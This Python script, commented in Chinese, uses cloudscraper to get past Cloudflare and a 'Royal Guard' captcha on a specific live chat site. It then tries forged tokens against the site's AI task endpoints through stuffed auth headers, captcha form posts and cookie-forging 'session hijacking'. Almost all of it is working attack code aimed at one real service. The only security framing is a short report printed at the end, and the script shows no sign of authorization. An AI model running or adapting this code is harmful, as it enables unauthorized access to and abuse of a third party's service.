#!/usr/bin/env python3
"""
CloudScraper 绕过系统
==================
使用 cloudscraper 绕过 Cloudflare 和 JavaScript 验证
动态生成和校验前端 token
"""

import cloudscraper
import json
import time
import random
import string
import base64
import hashlib
import hmac
import re
from datetime import datetime
from urllib.parse import urljoin, urlparse
import requests
from bs4 import BeautifulSoup

class CloudScraperBypass:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        self.results = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'failed_attempts': 0,
            'bypassed_methods': [],
            'failed_methods': []
        }
    
    def print_header(self):
        print("=" * 80)
        print("🔓 CloudScraper 绕过系统")
        print("=" * 80)
        print("🎯 目标: 绕过 iwoozie.baby/chat 的 Royal Guard 防护")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def extract_js_functions(self, html_content):
        """提取 JavaScript 函数"""
        print("🔍 提取 JavaScript 函数...")
        
        # 提取 Royal Guard 相关函数
        rg_patterns = [
            r'window\.__BotChallenger__\.getToken\s*=\s*function[^}]+}',
            r'function\s+getToken[^}]+}',
            r'window\.RGD_Done\s*=\s*[^;]+',
            r'function\s+submitForm[^}]+}',
            r'captchaForm[^}]+}'
        ]
        
        extracted_functions = {}
        for pattern in rg_patterns:
            matches = re.findall(pattern, html_content, re.DOTALL)
            if matches:
                function_name = pattern.split('\\')[0].replace('r', '')
                extracted_functions[function_name] = matches[0]
                print(f"  ✅ 提取到: {function_name}")
        
        return extracted_functions
    
    def analyze_verification_flow(self, html_content):
        """分析验证流程"""
        print("🔍 分析验证流程...")
        
        # 查找表单
        soup = BeautifulSoup(html_content, 'html.parser')
        form = soup.find('form', {'id': 'captchaForm'})
        
        if form:
            action = form.get('action', '')
            method = form.get('method', 'POST')
            print(f"  📝 表单信息: {method} {action}")
            
            # 查找隐藏字段
            hidden_inputs = form.find_all('input', {'type': 'hidden'})
            for input_field in hidden_inputs:
                name = input_field.get('name', '')
                value = input_field.get('value', '')
                print(f"  🔒 隐藏字段: {name} = {value}")
        
        # 查找 JavaScript 验证逻辑
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string and 'getToken' in script.string:
                print("  🔍 发现 getToken 函数")
                break
    
    def generate_fake_token(self):
        """生成伪造的 token"""
        print("�� 生成伪造 token...")
        
        # 多种 token 生成策略
        token_strategies = [
            self.generate_random_token,
            self.generate_timestamp_token,
            self.generate_hmac_token,
            self.generate_base64_token,
            self.generate_md5_token,
            self.generate_sha256_token,
            self.generate_uuid_token,
            self.generate_session_token
        ]
        
        tokens = []
        for strategy in token_strategies:
            try:
                token = strategy()
                tokens.append(token)
                print(f"  ✅ 生成 token: {token[:20]}...")
            except Exception as e:
                print(f"  ❌ 生成失败: {str(e)}")
        
        return tokens
    
    def generate_random_token(self):
        """生成随机 token"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def generate_timestamp_token(self):
        """生成基于时间戳的 token"""
        timestamp = str(int(time.time()))
        return hashlib.md5(timestamp.encode()).hexdigest()
    
    def generate_hmac_token(self):
        """生成 HMAC token"""
        message = f"bypass_{int(time.time())}"
        key = "royal_guard_secret"
        return hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()
    
    def generate_base64_token(self):
        """生成 Base64 token"""
        data = f"token_{int(time.time())}_{random.randint(1000, 9999)}"
        return base64.b64encode(data.encode()).decode()
    
    def generate_md5_token(self):
        """生成 MD5 token"""
        data = f"md5_{int(time.time())}_{random.randint(1000, 9999)}"
        return hashlib.md5(data.encode()).hexdigest()
    
    def generate_sha256_token(self):
        """生成 SHA256 token"""
        data = f"sha256_{int(time.time())}_{random.randint(1000, 9999)}"
        return hashlib.sha256(data.encode()).hexdigest()
    
    def generate_uuid_token(self):
        """生成 UUID 风格 token"""
        import uuid
        return str(uuid.uuid4()).replace('-', '')
    
    def generate_session_token(self):
        """生成会话 token"""
        session_data = {
            'user_id': random.randint(1000, 9999),
            'timestamp': int(time.time()),
            'session_id': ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }
        return base64.b64encode(json.dumps(session_data).encode()).decode()
    
    def test_token_bypass(self, tokens):
        """测试 token 绕过"""
        print("🎯 测试 token 绕过...")
        
        for i, token in enumerate(tokens):
            print(f"  测试 token {i+1}/{len(tokens)}: {token[:20]}...")
            
            # 测试直接 API 访问
            if self.test_direct_api_access(token):
                return True
            
            # 测试表单提交
            if self.test_form_submission(token):
                return True
            
            # 测试会话劫持
            if self.test_session_hijacking(token):
                return True
            
            time.sleep(1)
        
        return False
    
    def test_direct_api_access(self, token):
        """测试直接 API 访问"""
        print("    🔍 测试直接 API 访问...")
        
        headers = {
            'x-api-key': token,
            'Authorization': f'Bearer {token}',
            'x-auth-token': token,
            'x-token': token,
            'api-key': token,
            'token': token,
            'x-access-token': token,
            'x-session-token': token
        }
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        # 测试多个 API 端点
        api_endpoints = [
            '/api/quick/createAITask?model=GPT-4',
            '/api/quick/createAITask?model=Grok-4-Fast',
            '/api/chat',
            '/api/ai/chat',
            '/api/v1/chat'
        ]
        
        for endpoint in api_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.post(url, json=data, headers=headers, timeout=10)
                
                self.results['total_attempts'] += 1
                
                if response.status_code == 200:
                    try:
                        response_json = response.json()
                        if 'code' in response_json and response_json['code'] == 200:
                            print(f"    ✅ 成功绕过: {endpoint}")
                            self.results['successful_bypasses'] += 1
                            self.results['bypassed_methods'].append(f"direct_api_access: {endpoint}")
                            return True
                    except:
                        pass
                
                print(f"    ❌ 失败: {endpoint} (状态码: {response.status_code})")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"direct_api_access: {endpoint}")
                
            except Exception as e:
                print(f"    💥 异常: {endpoint} - {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"direct_api_access: {endpoint}")
        
        return False
    
    def test_form_submission(self, token):
        """测试表单提交"""
        print("    🔍 测试表单提交...")
        
        try:
            # 先访问验证页面
            response = self.session.get(f"{self.base_url}/chat", timeout=10)
            
            if response.status_code == 200:
                # 提交验证码表单
                form_data = {
                    'captcha_token': token
                }
                
                response = self.session.post(f"{self.base_url}/chat", data=form_data, timeout=10)
                
                self.results['total_attempts'] += 1
                
                if response.status_code == 200:
                    # 检查是否重定向到聊天页面
                    if 'chat' in response.url and 'verification' not in response.text.lower():
                        print("    ✅ 表单提交成功，可能已绕过验证")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("form_submission")
                        return True
                
                print(f"    ❌ 表单提交失败 (状态码: {response.status_code})")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append("form_submission")
            
        except Exception as e:
            print(f"    💥 表单提交异常: {str(e)}")
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("form_submission")
        
        return False
    
    def test_session_hijacking(self, token):
        """测试会话劫持"""
        print("    🔍 测试会话劫持...")
        
        try:
            # 设置会话 cookie
            self.session.cookies.set('captcha_token', token)
            self.session.cookies.set('session_id', token)
            self.session.cookies.set('auth_token', token)
            self.session.cookies.set('verification', 'passed')
            self.session.cookies.set('royal_guard', 'bypassed')
            
            # 测试 API 访问
            headers = {
                'x-api-key': token,
                'Cookie': f'captcha_token={token}; session_id={token}; auth_token={token}'
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": "Hello, this is a test message"
                }]
            }
            
            url = urljoin(self.base_url, '/api/quick/createAITask?model=GPT-4')
            response = self.session.post(url, json=data, headers=headers, timeout=10)
            
            self.results['total_attempts'] += 1
            
            if response.status_code == 200:
                try:
                    response_json = response.json()
                    if 'code' in response_json and response_json['code'] == 200:
                        print("    ✅ 会话劫持成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("session_hijacking")
                        return True
                except:
                    pass
            
            print(f"    ❌ 会话劫持失败 (状态码: {response.status_code})")
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("session_hijacking")
            
        except Exception as e:
            print(f"    💥 会话劫持异常: {str(e)}")
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("session_hijacking")
        
        return False
    
    def run_comprehensive_bypass(self):
        """运行综合绕过测试"""
        self.print_header()
        
        print("🚀 开始 CloudScraper 绕过测试...")
        print()
        
        # 步骤1: 访问验证页面
        print("📄 步骤1: 访问验证页面...")
        try:
            response = self.session.get(f"{self.base_url}/chat", timeout=15)
            print(f"  状态码: {response.status_code}")
            print(f"  URL: {response.url}")
            
            if response.status_code == 200:
                print("  ✅ 成功访问验证页面")
                
                # 分析验证流程
                self.analyze_verification_flow(response.text)
                
                # 提取 JavaScript 函数
                js_functions = self.extract_js_functions(response.text)
                
            else:
                print("  ❌ 无法访问验证页面")
                return
                
        except Exception as e:
            print(f"  💥 访问异常: {str(e)}")
            return
        
        print()
        
        # 步骤2: 生成伪造 token
        print("🎭 步骤2: 生成伪造 token...")
        tokens = self.generate_fake_token()
        print(f"  生成了 {len(tokens)} 个 token")
        print()
        
        # 步骤3: 测试 token 绕过
        print("🎯 步骤3: 测试 token 绕过...")
        success = self.test_token_bypass(tokens)
        
        print()
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成测试报告"""
        print("=" * 80)
        print("📋 CloudScraper 绕过测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.results['total_attempts']
        success = self.results['successful_bypasses']
        failed = self.results['failed_attempts']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总尝试次数: {total}")
        print(f"  成功绕过: {success}")
        print(f"  失败尝试: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 成功的绕过方法
        if self.results['bypassed_methods']:
            print(f"✅ 成功的绕过方法 ({len(self.results['bypassed_methods'])} 个):")
            for method in self.results['bypassed_methods']:
                print(f"  - {method}")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重漏洞，建议立即修复!")
            print("  1. 加强 token 验证机制")
            print("  2. 实施更严格的会话管理")
            print("  3. 添加 CloudScraper 检测")
            print("  4. 实施多层防护机制")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等风险，建议尽快改进")
            print("  1. 完善 token 验证")
            print("  2. 加强会话管理")
            print("  3. 添加安全监控")
        else:
            print("  ✅ 系统安全状况良好")
            print("  1. 继续保持现有防护措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    bypass = CloudScraperBypass()
    bypass.run_comprehensive_bypass()

if __name__ == "__main__":
    main()
